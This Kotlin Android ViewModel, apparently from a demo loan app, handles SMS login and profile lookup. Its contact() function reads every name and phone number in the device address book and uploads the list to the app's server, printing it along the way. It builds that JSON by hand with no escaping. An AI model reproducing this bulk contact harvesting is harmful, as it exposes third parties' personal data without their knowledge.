package com.apm29.yjw.demo.viewmodel

import android.content.ContentResolver
import android.provider.ContactsContract
import android.util.Log
import androidx.lifecycle.MutableLiveData
import com.apm29.yjw.demo.app.ErrorHandledObserver
import com.apm29.yjw.demo.arch.BaseViewModel
import com.apm29.yjw.demo.model.BaseBean
import com.apm29.yjw.demo.model.LoginBean
import com.apm29.yjw.demo.model.ProfileBean
import com.apm29.yjw.demo.model.api.UserApi
import com.apm29.yjw.demo.utils.getThreadSchedulers
import com.apm29.yjw.gentleloansdemo.BuildConfig
import com.google.gson.Gson
import io.reactivex.Observable


class DefaultFragmentViewModel : BaseViewModel() {


    var smsResult: MutableLiveData<BaseBean<String>> = MutableLiveData()
    var loginResult: MutableLiveData<BaseBean<LoginBean>> = MutableLiveData()
    var profile: MutableLiveData<BaseBean<ProfileBean>> = MutableLiveData()

    fun profileVerify() {
        mRetrofit.create(UserApi::class.java)
                .profile()
                .compose(getThreadSchedulers())
                .subscribe(
                        object : ErrorHandledObserver<BaseBean<ProfileBean>>(mErrorData, mErrorHandlerImpl) {
                            override fun onNext(t: BaseBean<ProfileBean>) {
                                profile.value = t
                            }
                        }
                )
    }

    fun sendLoginVerifySMS(mobile: String) {
        mRetrofit.create(UserApi::class.java)
                .sendSMS(mobile)
                .compose(getThreadSchedulers())
                .subscribe(
                        object : ErrorHandledObserver<BaseBean<String>>(mErrorData, mErrorHandlerImpl) {
                            override fun onNext(t: BaseBean<String>) {
                                mErrorData.value = t.msg
                                smsResult.value = t
                            }
                        }
                )
    }

    fun doLogin(mobile: String, smsCode: String) {
        mRetrofit.create(UserApi::class.java)
                .login(mobile, smsCode)
                .compose(getThreadSchedulers())
                .subscribe(
                        object : ErrorHandledObserver<BaseBean<LoginBean>>(mErrorData, mErrorHandlerImpl) {
                            override fun onNext(t: BaseBean<LoginBean>) {
                                mErrorData.value = t.msg
                                loginResult.value = t
                            }
                        }
                )
    }

    fun contact(contentResolver: ContentResolver?) {
        Observable.just(1)
                .compose(getThreadSchedulers())
                .map {
                    val list: ArrayList<Contact> = arrayListOf()
                    contentResolver?.let { cr ->
                        val userCursor = cr.query(
                                ContactsContract.RawContacts.CONTENT_URI, PROJECTION,
                                null, null, null)
                        while (userCursor?.moveToNext() == true) {
                            val id = userCursor.getString(userCursor.getColumnIndex(ContactsContract.RawContacts.CONTACT_ID))
                            val dataCursor = cr.query(ContactsContract.Data.CONTENT_URI, PROJECTION_DATA,
                                    SELECTION, arrayOf(id), null)
                            val contactData = Contact(id = id)
                            while (dataCursor?.moveToNext() == true) {
                                val mimeType = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Data.MIMETYPE))
                                val data1 = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Data.DATA1))
                                if (mimeType == ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE) {
                                    contactData.phone.add(data1)
                                } else if (mimeType == ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE) {
                                    contactData.name += data1
                                }
                            }
                            if (BuildConfig.DEBUG)
                                println(contactData)
                            list.add(contactData)
                            dataCursor?.close()
                        }
                        userCursor?.close()

                        list
                    }
                }
                .subscribe(
                        {
                            uploadContact(it)
                        },
                        {

                        }
                ).also {
                    mDisposables.add(it)
                }
    }

    private fun uploadContact(list: ArrayList<Contact>?) {
        mRetrofit.create(UserApi::class.java)
                .contact("[${list?.joinToString(separator = ",")}]".also {
                    println(it)
                })
                .compose(getThreadSchedulers())
                .subscribe(
                        object :ErrorHandledObserver<BaseBean<String>>(mErrorData,mErrorHandlerImpl){
                            override fun onNext(t: BaseBean<String>) {
                                Log.d(tag,t.msg)
                            }
                        }
                )
    }


}

data class Contact(var name: String = "", var phone: ArrayList<String> = arrayListOf(), val id: String) {
    override fun toString(): String {
        return "{ \"name\" :\"$name\", \"phone\":\"${phone.joinToString(separator = ",")}\"}"
    }


}

/*
 * Defines an array that contains column names to move from
 * the Cursor to the ListView.
 */
val PROJECTION = arrayOf(
        ContactsContract.RawContacts.CONTACT_ID
)
val PROJECTION_DATA = arrayOf(
        ContactsContract.Data.DATA1,
        ContactsContract.Data.MIMETYPE
)

private const val SELECTION = ContactsContract.RawContacts.CONTACT_ID + "= ?"
